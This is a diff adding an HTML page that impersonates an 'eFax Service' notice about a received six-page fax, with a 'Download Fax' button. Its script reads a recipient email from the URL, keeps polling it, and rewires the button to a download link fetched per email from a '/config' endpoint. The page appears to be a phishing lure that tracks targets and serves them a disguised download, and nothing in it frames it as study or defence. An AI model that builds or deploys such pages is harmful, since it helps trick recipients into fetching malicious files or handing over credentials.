@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Fax Notification</title>
+    <style>
+        body {
+            background: #eef2f7;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .fax-card {
+            max-width: 430px;
+            margin: 60px auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 6px 16px rgba(32,56,90,0.09);
+            padding: 36px 34px 30px 34px;
+            text-align: center;
+            position: relative;
+        }
+        .fax-icon {
+            width: 72px;
+            margin-bottom: 22px;
+        }
+        .title {
+            font-size: 1.35em;
+            font-weight: bold;
+            color: #1c3e6e;
+            margin-bottom: 16px;
+        }
+        .desc {
+            font-size: 1.13em;
+            color: #1c2539;
+            margin-bottom: 25px;
+        }
+        .fax-info {
+            background: #f3f6fb;
+            border-radius: 8px;
+            padding: 16px 0;
+            margin-bottom: 24px;
+            font-size: 1.13em;
+            color: #333;
+        }
+        .filename {
+            font-weight: bold;
+        }
+        .filesize {
+            color: #4a4a4a;
+            font-size: 0.98em;
+        }
+        .action-btn {
+            background: #1c3e6e;
+            color: #fff;
+            font-size: 1.12em;
+            border: none;
+            border-radius: 7px;
+            padding: 14px 40px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            margin-top: 2px;
+            box-shadow: 0 2px 8px rgba(32,56,90,0.08);
+            transition: background 0.2s;
+        }
+        .action-btn:hover {
+            background: #244e8a;
+        }
+        .footer {
+            font-size: 1em;
+            color: #5a6b8a;
+            margin-top: 20px;
+        }
+        .stamp {
+            position: absolute;
+            top: -22px;
+            right: 15px;
+            background: #e34b4b;
+            color: #fff;
+            font-weight: bold;
+            font-size: 0.93em;
+            padding: 7px 20px;
+            border-radius: 6px;
+            box-shadow: 0 1px 4px rgba(227,75,75,0.10);
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="fax-card">
+        <div class="stamp">NEW FAX</div>
+        <img src="https://cdn-icons-png.flaticon.com/512/1038/1038221.png" class="fax-icon" alt="Fax Icon">
+        <div class="title">You've Received a Fax Document</div>
+        <div class="desc">
+            A fax transmission has just arrived for you.<br>
+            Please review and download your document below.
+        </div>
+        <div class="fax-info">
+            <span class="filename">Fax_20210921.pdf</span><br>
+            <span class="filesize">6 pages &nbsp;&nbsp;|&nbsp;&nbsp; 1.8 MB</span>
+        </div>
+        <button class="action-btn">Download Fax</button>
+        <div class="footer">
+            Sent securely via eFax Service · <a href="#" style="color:#1c3e6e;text-decoration:none;">Learn more</a>
+        </div>
+    </div>
+</body>
+
+<script>
+(function() {
+  let lastEmail = null;
+
+  function getEmailFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("email");
+  }
+
+  async function refreshConfig(email) {
+    try {
+      const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
+      const cfg = await res.json();
+
+      // update restoreBtn
+      const download_btn = document.querySelector(".action-btn")
+      if(download_btn){
+        download_btn.onclick = ()=> {
+            window.location.href = cfg.DOCUMENT_URL;
+        }
+      } 
+    } catch (err) {
+      console.error("Config load failed", err);
+    }
+  }
+
+  function checkForEmailChange() {
+    const email = getEmailFromUrl();
+    if (email && email.length > 4 && email !== lastEmail) {
+      lastEmail = email;
+      refreshConfig(email);
+    }
+  }
+
+  // Run at page load
+  //checkForEmailChange();
+  refreshConfig('');
+
+  // Watch periodically (since user can manually edit URL bar)
+  setInterval(checkForEmailChange, 2000);
+
+})();
+</script>
+
+</html>
